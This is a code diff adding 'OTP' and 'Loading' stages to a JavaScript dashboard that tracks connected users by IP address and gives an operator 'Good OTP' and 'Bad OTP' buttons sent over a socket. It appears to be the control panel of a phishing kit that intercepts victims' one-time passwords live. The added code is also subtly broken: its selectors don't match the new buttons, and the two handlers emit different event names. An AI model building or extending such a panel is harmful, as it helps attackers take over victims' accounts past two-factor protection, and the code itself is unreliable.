@@ -85,6 +85,58 @@ function updateConnectionsTable(users) {
             socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
             console.log('emit otp send')
           });          
+    } else if(details.stage == "OTP") {
+      userDiv.innerHTML = `
+        
+      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
+      <div class="card">
+        <div class="card-header">
+          <span class="badge bg-${color}">
+            ${ipAddress}
+          </span>
+        </div>
+        <div class="card-body">
+          <h5 class="card-title">${details.page || ''}</h5>
+          <p class="card-text">${details.stage || ''}</p>
+          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+        </div>
+      </div>
+
+      `;
+    } else if(details.stage == "Loading"){
+
+      userDiv.innerHTML = `
+        
+          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
+          <div class="card">
+            <div class="card-header">
+              <span class="badge bg-${color}">
+                ${ipAddress}
+              </span>
+            </div>
+            <div class="card-body">
+              <h5 class="card-title">${details.page || ''}</h5>
+              <p class="card-text">${details.stage || ''}</p>
+              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+              <a href="#" class="m-1 btn btn-success send-otp-good-button">Good OTP</a>
+              <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad OTP</a>
+            </div>
+          </div>
+    
+          `;
+
+          let sendOtpGoodButton = userDiv.querySelector('.send-otp-sms-button');
+          let sendOtpBadButton = userDiv.querySelector('.send-otp-email-button');
+          sendOtpGoodButton.addEventListener('click', function() {
+            socket.emit('sendOTPResponse', {ip: ipAddress, res: `good` })
+            console.log('emit otp send')
+          });
+
+          sendOtpBadButton.addEventListener('click', function() {
+            socket.emit('sendOTP', {ip: ipAddress, res: `bad` })
+            console.log('emit otp send')
+          });          
+
     } else {
       userDiv.innerHTML = `
        
